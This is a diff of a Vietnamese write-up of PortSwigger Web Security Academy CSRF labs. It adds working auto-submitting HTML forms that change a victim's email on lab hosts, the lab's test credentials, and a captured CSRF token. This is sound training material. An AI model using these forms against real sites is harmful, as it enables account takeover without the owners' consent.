@@ -76,8 +76,8 @@ Viết form đơn giản gửi qua phần exploit:
 ```
 <form id='csrf' action='https://0ac90074044080ffc16121c5000c0026.web-security-academy.net/my-account/change-email' method='GET'>
 <input type='hidden' name='email' value='manhhuy08112002@gmailcom'>
-<input type='submit'
-</form/>
+<input type='submit'>
+</form>
 <script>
 document.getElementById('csrf').submit();
 
@@ -85,4 +85,39 @@ document.getElementById('csrf').submit();
 
 ```
 
-### [2. ]()
+### [2. CSRF where token validation depends on token being present](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-token-being-present)
+
+- Một số ứng dụng xác thực csrf token khi nó xuất hiện nhưng bỏ qua xác thực nếu mã thông báo bị bỏ qua, ta vẫn dùng cái trên được luôn, vì đăng nào bỏ csrf cũng được: 
+
+```
+<form id='csrf' action='https://0ab500c2030dc84fc0f0598d000200a1.web-security-academy.net/my-account/change-email' method='POST'>
+<input type='hidden' name='email' value='manhhuy2002@gmail.com'>
+<input type='submit'>
+</form>
+<script>
+document.getElementById('csrf').submit();
+</script> 
+
+```
+### [3. CSRF where token is not tied to user session](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-not-tied-to-user-session)
+
+Bài lab kế tiếp này là kiểu nó có xác thực csrf token nhưng mà nó kh ràng buộc là csrf với session là phải khớp với nhau, ý tưởng đơn giản của bài lab này là ta tạo 2 tài khoản và tráo đổi csrf token cho nhau: 
+
+2 user: 
+
+```
+wiener:peter
+carlos:montoya
+
+```
+
+Đầu tiên bắt request change email của wiener: 
+
+![image](https://user-images.githubusercontent.com/104350480/224557031-67d7d003-1e6e-4073-9e8a-ceaf8a55f72e.png)
+
+Lấy được csrf token: YabwCmwV1gU358QFi483EaZKHFDAEL5O
+Sau đó ta bắt request của carlos, rồi thay luôn csrf token của wiener vào: 
+
+![image](https://user-images.githubusercontent.com/104350480/224557098-de6f3967-5dcd-4a99-b14e-e135283b3850.png)
+
+
